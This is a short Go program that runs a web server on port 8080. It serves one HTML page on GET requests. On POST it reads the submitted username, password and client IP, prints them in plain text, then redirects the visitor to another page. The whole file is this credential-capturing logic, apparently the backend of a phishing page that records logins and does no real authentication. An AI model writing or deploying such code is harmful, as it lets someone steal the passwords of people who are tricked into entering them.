package main

import (
        //"io"
        "fmt"
       // "log"
        "net/http"
)

func login(w http.ResponseWriter, r *http.Request) {

	if r.Method == "POST" {
		name := r.FormValue("username")
                pass := r.FormValue("password")
                ip := r.RemoteAddr

		fmt.Println("Ip address = ", ip, "\n")
                fmt.Println("Username = ", name, "\n")
                fmt.Println("Password = ", pass, "\n")

		http.ServeFile(w, r, "/home/zerocool/monkey/monkeyBuisness.html")
	} else {
                 http.ServeFile(w, r, "Gnspes.html")		
	}

}

func main() {
	
	http.HandleFunc("/", login)
	http.ListenAndServe(":8080", nil)


}
